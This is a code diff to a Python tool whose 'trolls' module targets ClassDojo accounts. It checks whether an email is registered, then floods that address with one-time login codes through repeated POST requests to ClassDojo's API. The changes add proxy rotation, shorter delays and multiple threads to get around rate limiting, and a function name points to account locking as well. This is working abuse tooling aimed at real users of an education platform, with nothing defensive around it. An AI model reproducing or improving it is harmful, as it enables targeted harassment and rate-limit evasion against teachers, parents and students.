@@ -12,6 +12,10 @@ import themes
 from Libs import ThreadManager, Networking
 from Libs.StatusManager import status
 
+ss_threads = []
+classdojo_code_spammer_thread_thread = None
+spammer_incremental_lock = threading.Lock()
+
 def classdojo_check_account(email:str):
     res = requests.get(f"https://home.classdojo.com/api/user/emailValidation/{email}")
     data = res.json()
@@ -95,6 +99,7 @@ def classdojo_account_locker_request(email:str, result_text:str):
             return
 
 def classdojo_code_spammer():
+    global classdojo_code_spammer_thread_thread
     result_text = "trolls.classdojo_code_spammer_result_text"
 
     email = dpg.get_value("trolls.classdojo_code_spammer").strip()
@@ -107,7 +112,8 @@ def classdojo_code_spammer():
         themes.set_colored_result(result_text, "account no exist...", "Red")
         return
 
-    ThreadManager.do_thread(classdojo_code_spammer_thread, (email, result_text,))
+    classdojo_code_spammer_thread_thread = threading.Thread(target=classdojo_code_spammer_thread, args=(email, result_text,))
+    classdojo_code_spammer_thread_thread.start()
 
 
 def classdojo_code_spammer_request(email:str, result_text:str):
@@ -133,25 +139,33 @@ def classdojo_code_spammer_request(email:str, result_text:str):
         'email': email,
     }
 
-    response = requests.post('https://home.classdojo.com/api/oneTimeCode', headers=headers, json=json_data)
+    response = requests.post('https://home.classdojo.com/api/oneTimeCode', headers=headers, json=json_data, proxies=Libs.Networking.get_proxies())
     if response.status_code == 429:
         status.write("trolls/classdojo_code_spammer/rate_limited", True)
     else:
-        code_count = status.read("trolls/classdojo_code_spammer/code_send_count", 0)
-        code_count += 1
-        status.write("trolls/classdojo_code_spammer/code_send_count", code_count)
+        with spammer_incremental_lock:
+            code_count = status.read("trolls/classdojo_code_spammer/code_send_count", 0)
+            code_count += 1
+            status.write("trolls/classdojo_code_spammer/code_send_count", code_count)
 
 def classdojo_code_spammer_stop():
     status.write("trolls/classdojo_code_spammer/stop", True)
-    ThreadManager.clear_threads()
+    if classdojo_code_spammer_thread_thread is not None:
+        classdojo_code_spammer_thread_thread.join()
 
 def classdojo_code_spammer_thread(email:str, result_text:str):
     themes.set_colored_result(result_text, "sending codes...", "Mauve")
 
+    ThreadManager.max_threads = 3
+
     while True:
-        classdojo_code_spammer_request(email, result_text)
-        time.sleep(random.uniform(0.1, 0.25))
-        if status.read("trolls/classdojo_code_spammer/rate_limited", False):
+        ThreadManager.do_thread(classdojo_code_spammer_request, (email, result_text,))
+        if Libs.Networking.proxy_list_present():
+            time.sleep(random.uniform(0.05, 0.075))
+        else:
+            time.sleep(random.uniform(0.1, 0.25))
+
+        if status.read("trolls/classdojo_code_spammer/rate_limited", False) == None:
             delay_time = random.uniform(10, 60)
             for i in range(round(delay_time)):
                 if status.read("trolls/classdojo_code_spammer/stop", False):
